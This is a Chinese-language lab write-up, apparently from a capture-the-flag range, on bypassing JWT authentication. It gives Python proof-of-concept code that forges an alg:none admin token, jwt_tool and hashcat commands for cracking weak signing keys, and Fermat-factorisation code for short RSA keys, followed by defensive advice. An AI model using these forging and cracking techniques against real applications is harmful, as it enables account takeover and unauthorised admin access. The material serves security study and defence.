概述

JWT（JSON Web Token）是现代Web应用中最常见的认证机制之一。然而，其设计和实现中存在多个致命弱点，攻击者可以利用这些弱点绕过认证，甚至完全接管账户。

本文基于黑域护航靶场的实战经验，完整复现JWT认证绕过的全链路攻击。

⚠️ 本文仅供安全研究和学习使用，请勿用于非法用途。

信息收集

在开始攻击之前，首先需要了解目标的JWT实现方式：

  • 检查JWT的Header部分，确认alg字段值
  • 分析Payload结构，了解用户信息和权限
  • 测试是否存在alg:none漏洞
  • 尝试弱密钥爆破

JWT结构分析

一个标准的JWT由三部分组成，用.分隔：

alg:none 绕过

最经典的JWT绕过方式。当服务器接受alg:none时，攻击者可以伪造任意JWT而无需密钥。

攻击步骤

  1. 获取一个有效的JWT token
  2. 修改Header中的alg为none
  3. 修改Payload中的用户信息（如将role改为admin）
  4. 删除签名部分（最后一个.后的内容）
  5. 发送修改后的token

PoC

import base64
import json

# 原始token
token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxxxx"

# 解码Header和Payload
header = json.loads(base64.urlsafe_b64decode("eyJhbGciOiJIUzI1NiJ9=="))
payload = json.loads(base64.urlsafe_b64decode("eyJ1c2VyIjoiZ3Vlc3QifQ=="))

# 修改alg为none
header["alg"] = "none"

# 修改用户为admin
payload["user"] = "admin"
payload["role"] = "admin"

# 重新编码
new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()

# 构造新token (无签名)
new_token = f"{new_header}.{new_payload}."
print(f"Forged token: {new_token}")

弱密钥爆破

当服务器使用弱密钥时，可以通过字典攻击破解JWT签名。

工具推荐

  • jwt_tool - 功能最全面的JWT攻击工具
  • hashcat - 高性能密码破解
  • john - John the Ripper

爆破命令

# 使用jwt_tool爆破
python3 jwt_tool.py <JWT_TOKEN> -C -d /path/to/wordlist.txt

# 使用hashcat
hashcat -m 16500 jwt.txt wordlist.txt

RSA-512 分解

当JWT使用RSA算法但密钥长度过短（如RSA-512）时，可以通过数学方法分解模数N，获取私钥。

攻击原理

RSA-512的模数N只有512位，在现代计算能力下可以被分解。使用Fermat分解算法可以高效地找到P和Q。

from sympy import factorint
import gmpy2

# RSA-512 模数 (示例)
N = 0xbaa5501074a512345...

# 使用Fermat分解
def fermat_factor(n):
    a = gmpy2.isqrt(n) + 1
    b2 = a * a - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = a * a - n
    b = gmpy2.isqrt(b2)
    return a - b, a + b

p, q = fermat_factor(N)
print(f"P = {p}")
print(f"Q = {q}")

完整利用链

在黑域护航靶场中，完整的攻击链如下：

  1. 信息收集：发现JWT使用RSA-256算法，但密钥长度未知
  2. 密钥获取：通过/jwks.json端点获取公钥
  3. 密钥分析：发现N只有512位，可以分解
  4. 密钥分解：使用Fermat分解获取P和Q
  5. 私钥生成：计算私钥d
  6. Token伪造：使用私钥签发管理员token
  7. 权限获取：访问管理后台获取flag

防御建议

  • 禁止使用alg:none
  • 使用强密钥（RSA-2048以上，HS256密钥长度>256位）
  • 验证JWT的iss、aud、exp等声明
  • 使用最新的JWT库，避免自行实现
  • 定期轮换密钥
